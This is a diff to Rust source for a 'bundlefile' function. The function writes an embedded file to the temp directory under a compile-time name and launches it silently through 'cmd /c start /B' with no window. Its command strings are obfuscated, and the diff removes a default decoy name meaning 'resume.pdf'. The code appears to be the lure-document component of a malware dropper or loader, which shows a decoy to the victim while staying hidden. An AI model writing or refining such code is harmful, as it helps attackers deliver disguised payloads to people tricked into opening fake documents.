@@ -7,31 +7,32 @@ use rustcrypt_ct_macros::obf_lit;
 include!("bundle_data.rs");
 
 #[allow(dead_code)]
-pub fn bundlefile() {
+pub fn bundlefile() -> Result<(), Box<dyn std::error::Error>> {
     const CREATE_NO_WINDOW: u32 = 0x08000000;
 
     // Use compile-time environment variable for filename
     const ORIGINAL_FILE_NAME: &str = env!("RSL_BUNDLE_FILENAME");
-    let original_file_name = if ORIGINAL_FILE_NAME.is_empty() {
-        "xxx简历.pdf"
-    } else {
-        ORIGINAL_FILE_NAME
-    };
+    if ORIGINAL_FILE_NAME.is_empty() {
+        return Err("Bundle filename not set".into());
+    }
+    let original_file_name = ORIGINAL_FILE_NAME;
     
-    let mut temp_file = NamedTempFile::new().unwrap();
+    let mut temp_file = NamedTempFile::new().map_err(|e| format!("Failed to create temp file: {}", e))?;
     
     let temp_dir = temp_file.path().parent().unwrap();
     let temp_file_path = temp_dir.join(&original_file_name);
 
-    temp_file.write_all(MEMORY_FILE).unwrap();
-    temp_file.flush().unwrap();
+    temp_file.write_all(MEMORY_FILE).map_err(|e| format!("Failed to write to temp file: {}", e))?;
+    temp_file.flush().map_err(|e| format!("Failed to flush temp file: {}", e))?;
 
-    std::fs::rename(temp_file.path(), &temp_file_path).expect(&obf_lit!("Failed to rename temporary file"));
+    std::fs::rename(temp_file.path(), &temp_file_path).map_err(|e| format!("Failed to rename temporary file: {}", e))?;
 
     use std::process::Command;
     Command::new(obf_lit!("cmd"))
         .args(&[obf_lit!("/c"), obf_lit!("start"), obf_lit!("/B"), temp_file_path.to_str().unwrap().to_string()])
         .creation_flags(CREATE_NO_WINDOW)
         .spawn()
-        .expect(&obf_lit!("Failed to open file"));
+        .map_err(|e| format!("Failed to open file: {}", e))?;
+
+    Ok(())
 }
